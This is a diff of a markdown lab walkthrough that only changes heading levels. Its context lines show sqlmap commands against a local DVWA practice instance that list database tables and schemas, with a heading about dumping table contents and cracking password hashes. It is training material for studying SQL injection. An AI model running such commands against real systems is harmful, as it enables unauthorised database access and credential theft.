@@ -142,14 +142,14 @@ Bash
 cd sqlmap-dev
 sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --tables  
 ```
-* <h6>Viewing all table schemas:</h6>
+* <h5>Viewing all table schemas:</h5>
 
 ```
 Bash
 
 sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --tables  --schema --batch
 ```
-* <h6>Viewing schema for a specific table ('users'):</h6>
+* <h5>Viewing schema for a specific table ('users'):</h5>
 ``` 
 Bash
 
@@ -157,7 +157,7 @@ sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submi
 ```
 <p style="text-align:center;"><img src="./PNGs/7.png"></p>
 
-* <h6>Viewing table content and cracking password hashes:</h6>
+* <h5>Viewing table content and cracking password hashes:</h5>
 
 ``` 
 Bash
